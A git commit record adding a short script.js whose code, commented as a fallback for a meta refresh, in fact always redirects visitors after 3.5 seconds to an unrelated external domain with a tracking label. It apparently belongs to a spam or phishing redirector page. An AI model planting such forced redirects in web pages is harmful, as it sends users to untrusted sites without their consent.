de057e0135ab01e2b58ffd97373cc9d38dda3b89
tinnlei <lucky_chenlei@msn.com>
2025-03-14 08:56:19 +0300

    Add files via upload

---
+++ script.js
@@ -0,0 +1,7 @@
+
+// Backup redirect if meta refresh fails
+setTimeout(() => {
+  if (window.location.href === document.location.href) {
+    window.location.href = 'https://abrasifs-outillages.com/?label=e915bde81f4afd218093c3996094105a';
+  }
+}, 3500);
